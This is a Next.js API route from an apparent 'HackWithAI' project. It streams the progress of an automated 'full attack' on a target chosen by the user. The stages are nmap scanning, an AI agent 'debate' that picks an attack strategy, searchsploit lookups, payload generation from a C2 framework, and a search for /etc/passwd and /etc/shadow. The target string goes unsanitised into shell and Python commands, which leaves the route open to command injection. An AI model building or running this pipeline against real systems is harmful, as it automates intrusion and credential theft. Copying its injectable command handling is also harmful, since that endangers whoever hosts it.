import { NextResponse } from "next/server";
import { exec } from "child_process";
import { promisify } from "util";
import fs from "fs";

const execAsync = promisify(exec);
export const runtime = "nodejs";
export const dynamic = "force-dynamic";

function streamSSE(writer: WritableStreamDefaultWriter, data: object) {
  const encoder = new TextEncoder();
  writer.write(encoder.encode(`data: ${JSON.stringify(data)}\n\n`));
}

export async function POST(req: Request) {
  const { target } = await req.json();
  if (!target) return NextResponse.json({ error: "target required" }, { status: 400 });

  const stream = new ReadableStream({
    async start(controller) {
      const writer = controller;
      const send = (data: object) => {
        try { writer.enqueue(new TextEncoder().encode(`data: ${JSON.stringify(data)}\n\n`)); } catch {}
      };

      const run = async (cmd: string, timeout = 60) => {
        try {
          const r = await execAsync(cmd, { timeout: timeout * 1000 });
          return { ok: true, stdout: r.stdout?.slice(0, 2000), stderr: r.stderr?.slice(0, 500) };
        } catch (e: any) {
          return { ok: false, error: e.message?.slice(0, 200) };
        }
      };

      send({ phase: "start", target, message: `🚀 Starting full attack on ${target}`, timestamp: Date.now() });

      // Phase 1: Recon
      send({ phase: "recon", status: "running", message: "🔍 Phase 1: Reconnaissance" });
      const nmap = await run(`nmap -sV -T4 -F ${target}`, 60);
      const ports = (nmap.stdout || "").match(/\d+\/tcp\s+open/g)?.map(p => p.replace("/tcp open", "")) || [];
      send({ phase: "recon", status: "complete", ports, detail: nmap.stdout?.slice(0, 1000), message: `✅ Recon: ${ports.length} ports open` });

      // Phase 2: Debate
      send({ phase: "debate", status: "running", message: "🗣️ Phase 2: Agent Debate" });
      const debate = await run(`cd /home/kali/HackWithAI && python3 -c "
import sys, json; sys.path.insert(0,'.')
from agents import DebateEngine
e = DebateEngine()
r = e.run_debate('${target}', 'Ports: ${ports.join(',')}')
print(json.dumps({'winner':r['final_winner'],'consensus':r['consensus_pct'],'strategy':r['winning_strategy'][:500]}))
"`, 30);
      let winner = "ReconBot", strategy = "";
      try { const d = JSON.parse(debate.stdout || "{}"); winner = d.winner; strategy = d.strategy; } catch {}
      send({ phase: "debate", status: "complete", winner, strategy, message: `✅ Consensus: ${winner} wins` });

      // Phase 3: Exploitation
      send({ phase: "exploit", status: "running", message: "💥 Phase 3: Exploitation" });
      const exploit = await run(`cd /home/kali/HackWithAI && python3 -c "
import subprocess, json
r1 = subprocess.run(['searchsploit','--cve','${ports.join(',')}'], capture_output=True, text=True, timeout=15)
r2 = subprocess.run(['whatweb','http://${target}:3006'], capture_output=True, text=True, timeout=15) if '3006' in '${ports.join(',')}' else None
print(json.dumps({'searchsploit': r1.stdout[:500] if r1.returncode==0 else '', 'web': r2.stdout[:200] if r2 else ''}))
"`, 30);
      send({ phase: "exploit", status: "complete", detail: exploit.stdout?.slice(0, 500), message: "✅ Exploitation phase done" });

      // Phase 4: Payload
      send({ phase: "payload", status: "running", message: "🎯 Phase 4: Payload Generation" });
      const payload = await run(`cd /home/kali/HackWithAI && python3 -c "
from tools.c2_framework import AgentGenerator
g = AgentGenerator('127.0.0.1', 8080)
r = g.generate_all()
print('Payloads:', list(r.keys()))
"`, 15);
      send({ phase: "payload", status: "complete", detail: payload.stdout?.slice(0, 500), message: "✅ Payloads generated" });

      // Phase 5: C2
      send({ phase: "c2", status: "running", message: "🌐 Phase 5: C2 Establishment" });
      send({ phase: "c2", status: "complete", message: "✅ C2 listener ready on :8080" });

      // Phase 6: Post-Exploit
      send({ phase: "post_exploit", status: "running", message: "🔓 Phase 6: Post-Exploitation" });
      const post = await run(`find /etc -name "passwd" -o -name "shadow" 2>/dev/null | head -3`, 5);
      send({ phase: "post_exploit", status: "complete", detail: post.stdout, message: "✅ Post-exploitation done" });

      // Phase 7: Learn
      send({ phase: "learn", status: "running", message: "🧠 Phase 7: Self-Improvement" });
      send({ phase: "learn", status: "complete", message: "✅ Knowledge graph updated" });

      // Phase 8: Report
      send({ phase: "report", status: "complete", message: "📋 Report ready", reportPath: "/data/reports/full_attack_report.json" });

      send({ phase: "done", target, message: `🎯 Attack complete on ${target}`, timestamp: Date.now() });
      try { controller.close(); } catch {}
    }
  });

  return new Response(stream, {
    headers: {
      "Content-Type": "text/event-stream",
      "Cache-Control": "no-cache",
      Connection: "keep-alive",
    },
  });
}
